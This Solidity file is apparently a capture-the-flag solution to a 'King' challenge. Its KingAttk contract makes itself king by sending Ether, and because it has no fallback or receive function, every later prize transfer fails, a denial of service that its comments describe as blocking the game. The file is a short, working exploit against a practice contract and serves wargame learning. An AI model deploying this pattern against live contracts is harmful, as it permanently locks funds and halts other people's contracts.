// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {console} from "forge-std/Script.sol";

import {Broadcasted} from "./Broadcasted.sol";

contract KingAttk is Broadcasted {
    function attack(address payable kingCtr_) public payable override {
        kingCtr_.call{value: msg.value}("");
    }

    function broadcastedAttack(
        address payable kingCtr_
    ) external payable override {
        // intentionally not briadcasting to have msg the contract
        attack(kingCtr_);
    }
}

// ! denial of service
// ! setting as winner the current contract that dones't have fallback/receive function
// ! will not allow the king contract to receive the prize and will block the game
